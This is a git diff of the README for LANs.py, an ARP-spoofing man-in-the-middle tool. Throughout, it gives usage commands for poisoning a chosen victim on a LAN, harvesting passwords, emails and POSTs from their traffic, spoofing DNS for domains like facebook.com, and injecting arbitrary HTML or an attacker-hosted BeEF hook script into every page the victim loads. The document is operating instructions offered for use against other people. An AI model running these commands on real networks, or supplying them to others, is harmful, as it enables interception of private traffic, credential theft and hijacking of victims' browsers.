@@ -3,12 +3,13 @@ LANs.py
 
 Multithreaded asynchronous packet parsing/injecting arp spoofer.
 
-Individually arpspoofs the target box, router and DNS server if necessary. Displays all most the interesting bits of their traffic. Cleans up after itself.
+Individually arpspoofs the target box, router and DNS server if necessary. Does not poison anyone else on the network. Displays all most the interesting bits of their traffic and can inject custom html into pages they visit. Cleans up after itself.
 
 
 Prereqs: Linux, scapy, python nfqueue-bindings, aircrack-ng, python twisted, BeEF (optional), wireless card capable of injection
 
-Tested on Kali 1.0
+Tested on Kali 1.0. In the following examples 192.168.0.5 will be the attacking machine and 192.168.0.10 will be the victim.
+
 
 
 Simplest usage:
@@ -17,10 +18,9 @@ Simplest usage:
 python LANs.py
 ```
 
-Because there's no -ip option this will arp scan the network, compare it to a live running promiscuous capture, and tell you the clients on the network that are sending the most packets, give Windows netbios names, then you can Ctrl-C and pick your target which it will then ARP spoof. Simple ARP spoofing.
+Because there's no -ip option this will arp scan the network, compare it to a live running promiscuous capture, and tell you the clients on the network that are sending the most packets, give Windows netbios names, then you can Ctrl-C and pick your target which it will then ARP spoof. Simple ARP spoofing. 
 
-
-Passive usage:
+Passive harvesting usage:
 
 ```
 python LANs.py -u -d -p -ip 192.168.0.10
@@ -50,7 +50,16 @@ panel that the browser is hooked on. This is OK. If they don't get hooked on the
 python LANs.py -c '<title>Owned.</title>'
 ```
 
-Inject arbitrary HTML into pages the victim visits. First tries to inject it after the first <head> and failing that injects prior to the first </head>.
+Inject arbitrary HTML into pages the victim visits. First tries to inject it after the first <head> and failing that injects prior to the first </head>. This example will change the page title to 'Owned.'
+
+
+Read from pcap:
+
+```
+python LANs.py -pcap libpcapfilename -ip 192.168.0.10
+```
+
+To read from a pcap file you must include the target's IP address with the -ip option
 
 
 Aggressive usage:
@@ -64,44 +73,47 @@ All options:
 python LANs.py -h
 ```
 
--u: prints URLs visited; truncates at 150 characters and filters image/css/js/woff/svg urls since they spam the output and are uninteresting
+-b BEEF_HOOK_URL: copy the BeEF hook URL to inject it into every page the victim visits, eg: -b http://192.168.1.10:3000/hook.js
+
+-c 'HTML CODE': inject arbitrary html code into pages the victim vists; include the quotes when selecting HTML to inject
 
 -d: open an xterm with driftnet to see all images they view
 
--p: print username/passwords for FTP/IMAP/POP/IRC/HTTP, HTTP POSTs made, all searches made, incoming/outgoing emails, and IRC messages sent/received
+-dns DOMAIN: spoof the DNS of DOMAIN. e.g. -dns facebook.com will DNS spoof every DNS request to facebook.com or subdomain.facebook.com
 
--ip: target this IP address 
+-u: prints URLs visited; truncates at 150 characters and filters image/css/js/woff/svg urls since they spam the output and are uninteresting
 
 -i INTERFACE: specify interface; default is first interface in `ip route`, eg: -i wlan0
 
--dns DOMAIN: spoof the DNS of DOMAIN. e.g. -dns facebook.com will DNS spoof every DNS request to facebook.com or subdomain.facebook.com
+-ip: target this IP address 
 
 -n: performs a quick nmap scan of the target
 
 -na: performs an aggressive nmap scan in the background and outputs to [victim IP address].nmap.txt
 
+-p: print username/passwords for FTP/IMAP/POP/IRC/HTTP, HTTP POSTs made, all searches made, incoming/outgoing emails, and IRC messages sent/received
+
+-pcap PCAP_FILE: parse through all the packets in a pcap file; requires the -ip [target's IP address] argument
+
 -v: show verbose URLs which do not truncate at 150 characters like -u
-
--b BEEF_HOOK_URL: copy the BeEF hook URL to inject it into every page the victim visits, eg: -b http://192.168.1.10:3000/hook.js
-
--c 'HTML CODE': inject arbitrary html code into pages the victim vists; include the quotes when selecting HTML to inject
-
 
 
 Cleans the following on Ctrl-C:
 
-  Turn off IP forwarding
+--Turn off IP forwarding
 
-  Flush iptables firewall
+--Flush iptables firewall
 
-  Individually restore each machine's ARP table
+--Individually restore each machine's ARP table
+
 
 
 To do:
 
-Add ability to read from pcap file
+-Add ability to read from pcap file
+
 
 
 Technical details:
 
-This script uses python nfqueue-bindings wrapped in Twisted to feed packets to callback functions as well as drop or forward certain packets. From there scapy takes over to parse and inject. 
+This script uses python an nfqueue-bindings queue wrapped in a Twisted IReadDescriptor to feed packets to callback functions. nfqueue-bindings is used to drop and forward certain packets. Python's scapy library does the work to parse and inject packets.
